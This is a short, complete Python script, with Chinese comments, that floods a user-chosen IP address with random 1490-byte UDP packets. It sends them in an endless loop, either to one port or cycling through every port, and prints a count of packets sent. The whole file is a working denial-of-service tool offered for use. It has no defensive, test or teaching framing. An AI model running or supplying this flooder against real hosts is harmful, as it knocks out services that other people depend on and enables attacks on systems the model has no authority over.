# coding: utf8

print("Initializing...\n")
import socket
import random
import threading

# 构建socket通讯
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# 构建字节数据包
byte = random._urandom(1490)

try:
    ip = raw_input("IP Dress: ")
    port = raw_input("Port(Leave a blank to attack all of the ports): ")
except:
    ip = input("IP Dress: ")
    port = input("Port(Leave a blank to attack all of the ports): ")

if port == "":
    port = 1
    re = True
else:
    port = int(port)
    re = False

sent = 0

while True:
    sock.sendto(byte, (ip, port))
    sent = sent + 1
    print("Sent %s packet to %s throught port %s." % (str(sent), ip, str(port)))

    if re:
        port = port + 1
    else:
        pass

    if port == 65534:
        port = 1
